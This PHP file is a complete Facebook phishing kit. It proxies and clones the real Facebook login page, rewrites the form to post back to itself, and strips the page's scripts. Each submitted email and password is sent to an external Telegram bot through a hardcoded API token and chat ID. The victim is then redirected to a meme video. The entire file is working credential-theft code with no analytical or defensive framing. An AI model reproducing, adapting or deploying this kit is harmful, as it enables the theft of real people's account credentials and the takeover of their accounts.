<?php

require_once('vendor/autoload.php');

function pegar($string, $start, $end){
    $str = explode($start, $string)[1];
    return explode($end, $str)[0];
}

$detect = new Mobile_Detect;

$url = 'https://pt-br.facebook.com/';

if ($detect->isMobile())
{
 $url = 'm.facebook.com';
}

if(empty($_POST['email']) && empty($_POST['password'])){

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language: pt-PT,pt;q=0.9',
    'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-user: ?1',
));

$response1 = curl_exec($ch);
$action = pegar($response1, 'action="', '"');
$place1 = str_replace('name="pass"', 'name="password"', $response1);
$place2 = str_replace($action, 'index.php', $place1);
echo preg_replace('#<script(.*?)>(.*?)</script>#is', '', $place2);

}else{
    $conta = $_POST['email'].'|'.$_POST['password'];

    $apiToken = "5231035675:AAF5xFBoCBmZ6B-m1XIhybsQuQmttNj-btM";
    $data = [
        'chat_id' => '-694727911',
        'text' => $conta
    ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

    header("Location: https://www.facebook.com/humoredicasdeutilidade/videos/s%C3%B3-memes-pra-chorar-de-rir/496131701496667");

}










